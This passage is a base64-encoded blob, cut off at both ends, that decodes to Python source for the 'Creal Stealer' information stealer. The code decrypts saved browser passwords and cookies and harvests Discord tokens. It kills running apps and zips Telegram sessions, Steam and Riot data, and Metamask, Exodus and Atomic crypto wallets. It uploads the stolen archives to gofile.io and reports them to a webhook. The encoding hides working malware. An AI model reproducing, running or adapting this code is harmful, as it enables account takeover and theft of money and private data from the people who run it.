wgbWFzdGVyX2tleSl9IikKICAgICAgICAgICAgICAgIFA0c3N3Q291bnQgKz0gMQogICAgICAgIHdyMXRlZjByZjFsMyhQNHNzdywgJ3Bhc3N3JykKCiAgICBDMDBrMTMgPSBbXSAgICAKICAgIGRlZiBnZXRDMDBrMTMocGF0aCwgYXJnKToKICAgICAgICBnbG9iYWwgQzAwazEzLCBDb29raUNvdW50CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KICAgICAgICAKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0Nvb2tpZXMiCiAgICAgICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KICAgICAgICAKICAgICAgICB0ZW1wZm9sZCA9IHRlbXAgKyAiY3IiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKICAgICAgICAKICAgICAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIEZST00gY29va2llcyIpCiAgICAgICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgICAgICAKICAgICAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICAgICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgICAgIGZvciByb3cgaW4gZGF0YTogCiAgICAgICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgICAgIG9sZCA9IHdhCiAgICAgICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdCiAgICAgICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgICAgIEMwMGsxMy5hcHBlbmQoZiJ7cm93WzBdfQlUUlVFCS8JRkFMU0UJMjU5NzU3MzQ1Ngl7cm93WzFdfQl7RDNrcnlwdFY0bFUzKHJvd1syXSwgbWFzdGVyX2tleSl9IikKICAgICAgICAgICAgICAgIENvb2tpQ291bnQgKz0gMQogICAgICAgIHdyMXRlZjByZjFsMyhDMDBrMTMsICdjb29rJykKCiAgICBkZWYgRzN0RDFzYzByZChwYXRoLCBhcmcpOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4KCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgICAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICAgICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAgICAgIyBwcmludChwYXRoLCBtYXN0ZXJfa2V5KQogICAgICAgIAogICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICAgICAjIHByaW50KHBhdGgsIGZpbGUpCiAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6CiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgZm9yIHQwazNuIGluIHJlLmZpbmRhbGwociJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiLCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFQwazNucwogICAgICAgICAgICAgICAgICAgICAgICB0MGszbkRlY29kZWQgPSBEM2tyeXB0VjRsVTMoYjY0ZGVjb2RlKHQwazNuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoMWNrVDRrMW4odDBrM25EZWNvZGVkKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0MGszbkRlY29kZWQgaW4gVDBrM25zOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVDBrM25zICs9IHQwazNuRGVjb2RlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgd3JpdGVmb3JmaWxlKFRva2VucywgJ3Rva2VucycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsMDVkVDRrMzEodDBrM25EZWNvZGVkLCBwYXRoKQoKICAgIGRlZiBHYXRoZXJaaXBzKHBhdGhzMSwgcGF0aHMyLCBwYXRoczMpOgogICAgICAgIHRodHRodCA9IFtdCiAgICAgICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkKICAgICAgICAgICAgYS5zdGFydCgpCiAgICAgICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICAgICAgZm9yIHBhdHQgaW4gcGF0aHMyOgogICAgICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkKICAgICAgICAgICAgYS5zdGFydCgpCiAgICAgICAgICAgIHRodHRodC5hcHBlbmQoYSkKICAgICAgICAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICAgICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgICAgICB0aHJlYWQuam9pbigpCiAgICAgICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgICAgICB3YWwsIGdhLCBvdCA9ICIiLCcnLCcnCiAgICAgICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICAgICAgZm9yIGkgaW4gV2FsbGV0c1ppcDoKICAgICAgICAgICAgICAgIHdhbCArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICAgICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgICAgICBnYSA9ICI6dmlkZW9fZ2FtZTogIOKAoiAgR2FtaW5nOlxuIgogICAgICAgICAgICBmb3IgaSBpbiBHYW1pbmdaaXA6CiAgICAgICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICAgICAgaWYgbm90IGxlbihPdGhlclppcCkgPT0gMDoKICAgICAgICAgICAgb3QgPSAiOnRpY2tldHM6ICDigKIgIEFwcHNcbiIKICAgICAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgICAgICBvdCArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iICAgICAgICAgIAogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJDcmVhbCBaaXBzIiwKICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYie3dhbH1cbntnYX1cbntvdH0iLAogICAgICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIEwwNGR1cmwxYih0ZWxuZXQsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKCiAgICBkZWYgWmlwVGVsZWdyYW0ocGF0aCwgYXJnLCBwcm9jYyk6CiAgICAgICAgZ2xvYmFsIE90aGVyWmlwCiAgICAgICAgcGF0aEMgPSBwYXRoCiAgICAgICAgbmFtZSA9IGFyZwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgICAgICB6ZiA9IFppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZSBhbmQgbm90ICJ0ZHVtbXkiIGluIGZpbGUgYW5kIG5vdCAidXNlcl9kYXRhIiBpbiBmaWxlIGFuZCBub3QgIndlYnZpZXciIGluIGZpbGU6IAogICAgICAgICAgICAgICAgemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgICAgIHpmLmNsb3NlKCkKCiAgICAgICAgbG5payA9IHVwbG9hZFRvQW5vbmZpbGVzKGYne3BhdGhDfS97bmFtZX0uemlwJykKICAgICAgICAjbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICAgICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKICAgICAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pCgogICAgZGVmIFoxcFRoMW5ncyhwYXRoLCBhcmcsIHByb2NjKToKICAgICAgICBwYXRoQyA9IHBhdGgKICAgICAgICBuYW1lID0gYXJnCiAgICAgICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpCiAgICAgICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpCgogICAgICAgIGlmICJua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgaW4gYXJnOgogICAgICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcKICAgICAgICAKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICAgICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoKICAgICAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICAgICAgZWxpZiAiU3RlYW0iIGluIGFyZzoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOiByZXR1cm4KICAgICAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgICAgICBkYXRhID0gZi5yZWFkbGluZXMoKQogICAgICAgICAgICAjIHByaW50KGRhdGEpCiAgICAgICAgICAgIGZvdW5kID0gRmFsc2UKICAgICAgICAgICAgZm9yIGwgaW4gZGF0YToKICAgICAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgICAgIGlmIGZvdW5kID09IEZhbHNlOiByZXR1cm4KICAgICAgICAgICAgbmFtZSA9IGFyZwoKCiAgICAgICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgICAgICB6Zi5jbG9zZSgpCgogICAgICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpCiAgICAgICAgI2xuaWsgPSAiaHR0cHM6Ly9nb29nbGUuY29tIgogICAgICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCgogICAgICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiZW9nYWVhb2VobGVmIiBpbiBhcmc6CiAgICAgICAgICAgIFdhbGxldHNaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgICAgICBlbGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWUgb3IgIlN0ZWFtIiBpbiBuYW1lIG9yICJSaW90Q2xpIiBpbiBuYW1lOgogICAgICAgICAgICBHYW1pbmdaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBPdGhlclppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQoKCiAgICBkZWYgR2F0aGVyQWxsKCk6CiAgICAgICAgJyAgICAgICAgICAgICAgICAgICBEZWZhdWx0IFBhdGggPCAwID4gICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2VzTmFtZSA8IDEgPiAgICAgICAgVG9rZW4gIDwgMiA+ICAgICAgICAgICAgICBQYXNzd29yZCA8IDMgPiAgICAgQ29va2llcyA8IDQgPiAgICAgICAgICAgICAgICAgICAgICAgICAgRXh0ZW50aW9ucyA8IDUgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnCiAgICAgICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgU3RhYmxlIiwgICAgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdCiAgICAgICAgXQoKICAgICAgICBkaXNjb3JkUGF0aHMgPSBbCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9EaXNjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L0xpZ2h0Y29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkY2FuYXJ5IiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRwdGIiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIF0KCiAgICAgICAgUGF0aHNUb1ppcCA9IFsKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L2F0b21pYy9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAnIkF0b21pYyBXYWxsZXQuZXhlIicsICJXYWxsZXQiXSwKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAic3RlYW0uZXhlIiwgIlN0ZWFtIl0sCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9OYXRpb25zR2xvcnkvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgIk5hdGlvbnNHbG9yeS5leGUiLCAiTmF0aW9uc0dsb3J5Il0sCiAgICAgICAgICAgIFtmIntsb2NhbH0vUmlvdCBHYW1lcy9SaW90IENsaWVudC9EYXRhIiwgIlJpb3RDbGllbnRTZXJ2aWNlcy5leGUiLCAiUmlvdENsaWVudCJdCiAgICAgICAgXQogICAgICAgIFRlbGVncmFtID0gW2Yie3JvYW1pbmd9L1RlbGVncmFtIERlc2t0b3AvdGRhdGEiLCAndGVsZWdyYW0uZXhlJywgIlRlbGVncmFtIl0KCiAgICAgICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFQwazNuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkKICAgICAgICAgICAgYS5zdGFydCgpCiAgICAgICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCiAgICAgICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOiAKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUczdEQxc2MwcmQsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMV1dKQogICAgICAgICAgICBhLnN0YXJ0KCkKICAgICAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICAgICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFA0c3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICAgICAgYS5zdGFydCgpCiAgICAgICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgICAgIFRoQ29rayA9IFtdCiAgICAgICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldEMwMGsxMywgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICBUaENva2suYXBwZW5kKGEpCgogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUdhdGhlclppcHMsIGFyZ3M9W2Jyb3dzZXJQYXRocywgUGF0aHNUb1ppcCwgVGVsZWdyYW1dKS5zdGFydCgpCgoKICAgICAgICBmb3IgdGhyZWFkIGluIFRoQ29razogdGhyZWFkLmpvaW4oKQogICAgICAgIERFVEVDVEVEID0gVFI2c3QoQzAwazEzKQogICAgICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybgoKICAgICAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pLnN0YXJ0KCkKICAgICAgICAKICAgICAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOgogICAgICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aMXBUaDFuZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAgICAgCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W1RlbGVncmFtWzBdLCBUZWxlZ3JhbVsyXSwgVGVsZWdyYW1bMV1dKS5zdGFydCgpCgogICAgICAgIGZvciB0aHJlYWQgaW4gVGhyZWFkbGlzdDogCiAgICAgICAgICAgIHRocmVhZC5qb2luKCkKICAgICAgICBnbG9iYWwgdXB0aHMKICAgICAgICB1cHRocyA9IFtdCgogICAgICAgIGZvciBmaWxlIGluIFsiY3JwYXNzdy50eHQiLCAiY3Jjb29rLnR4dCJdOiAKICAgICAgICAgICAgIyB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkKICAgICAgICAgICAgdXBsb2FkKGZpbGUucmVwbGFjZSgiLnR4dCIsICIiKSwgdXBsb2FkVG9Bbm9uZmlsZXMob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkpCgogICAgZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOgogICAgICAgIHRyeTpyZXR1cm4gcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8ve3JlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuZ29maWxlLmlvL2dldFNlcnZlciIpLmpzb24oKVsiZGF0YSJdWyJzZXJ2ZXIiXX0uZ29maWxlLmlvL3VwbG9hZEZpbGUnLCBmaWxlcz17J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfSkuanNvbigpWyJkYXRhIl1bImRvd25sb2FkUGFnZSJdCiAgICAgICAgZXhjZXB0OnJldHVybiBGYWxzZQoKICAgICMgZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOnMKICAgICMgICAgIHRyeToKICAgICMgICAgICAgICBmaWxlcyA9IHsgImZpbGUiOiAocGF0aCwgb3BlbihwYXRoLCBtb2RlPSdyYicpKSB9CiAgICAjICAgICAgICAgdXBsb2FkID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly90cmF